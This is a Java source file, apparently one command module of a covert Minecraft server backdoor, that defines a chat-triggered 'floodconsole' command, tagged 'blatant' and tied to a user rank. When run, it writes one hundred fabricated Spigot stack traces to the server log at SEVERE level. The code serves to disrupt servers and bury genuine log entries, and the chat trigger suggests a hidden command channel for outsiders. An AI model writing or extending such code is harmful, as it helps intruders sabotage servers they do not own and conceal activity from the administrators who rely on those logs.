package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import java.util.logging.Level;
import org.bukkit.Bukkit;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "floodconsole",
   description = "Flood the console",
   blatant = true,
   rank = Rank.LITE
)
public class FloodConsoleCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      for (int i = 0; i < 100; i++) {
         String[] var5 = new String[]{
                 "Could not pass event EntityTargetLivingEntityEvent to Bukkit",
                 "org.bukkit.event.EventException",
                 "at org.bukkit.plugin.java.JavaPluginLoader$1.execute(JavaPluginLoader.java:306) ~[spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:62) ~[spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at org.bukkit.plugin.SimplePluginManager.fireEvent(SimplePluginManager.java:502) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at org.bukkit.plugin.SimplePluginManager.callEvent(SimplePluginManager.java:487) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at net.minecraft.server.v1_11_R1.EntityInsentient.setGoalTarget(EntityInsentient.java:143) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at net.minecraft.server.v1_11_R1.PathfinderGoalTarget.d(PathfinderGoalTarget.java:83) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at net.minecraft.server.v1_11_R1.PathfinderGoalSelector.a(SourceFile:113) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at net.minecraft.server.v1_11_R1.EntityInsentient.doTick(EntityInsentient.java:653) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at net.minecraft.server.v1_11_R1.EntityLiving.n(EntityLiving.java:2037) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at net.minecraft.server.v1_11_R1.EntityInsentient.n(EntityInsentient.java:501) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at net.minecraft.server.v1_11_R1.EntityMonster.n(EntityMonster.java:24) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at net.minecraft.server.v1_11_R1.EntityZombie.n(EntityZombie.java:155) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at net.minecraft.server.v1_11_R1.EntityLiving.A_(EntityLiving.java:1893) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at net.minecraft.server.v1_11_R1.EntityInsentient.A_(EntityInsentient.java:244) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at net.minecraft.server.v1_11_R1.EntityMonster.A_(EntityMonster.java:28) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at net.minecraft.server.v1_11_R1.EntityZombieVillager.A_(EntityZombieVillager.java:70) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at net.minecraft.server.v1_11_R1.World.entityJoinedWorld(World.java:1629) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at net.minecraft.server.v1_11_R1.World.h(World.java:1604) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at net.minecraft.server.v1_11_R1.World.tickEntities(World.java:1430) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at net.minecraft.server.v1_11_R1.WorldServer.tickEntities(WorldServer.java:618) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at net.minecraft.server.v1_11_R1.MinecraftServer.D(MinecraftServer.java:814) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at net.minecraft.server.v1_11_R1.DedicatedServer.D(DedicatedServer.java:399) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at net.minecraft.server.v1_11_R1.MinecraftServer.C(MinecraftServer.java:678) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at net.minecraft.server.v1_11_R1.MinecraftServer.run(MinecraftServer.java:576) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        at java.lang.Thread.run(Unknown Source) [?:1.8.0_77]",
                 "Caused by: java.lang.NullPointerException",
                 "  at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:214) ~[?:?]",
                 "        at sun.reflect.GeneratedMethodAccessor7.invoke(Unknown Source) ~[?:?]",
                 "        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_77]",
                 "        at java.lang.reflect.Method.invoke(Unknown Source) ~[?:1.8.0_77]",
                 "        at org.bukkit.plugin.java.JavaPluginLoader$1.execute(JavaPluginLoader.java:302) ~[spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                 "        ... 24 more"
         };
         Bukkit.getLogger().log(Level.SEVERE, String.join("\n", var5));
      }
   }
}
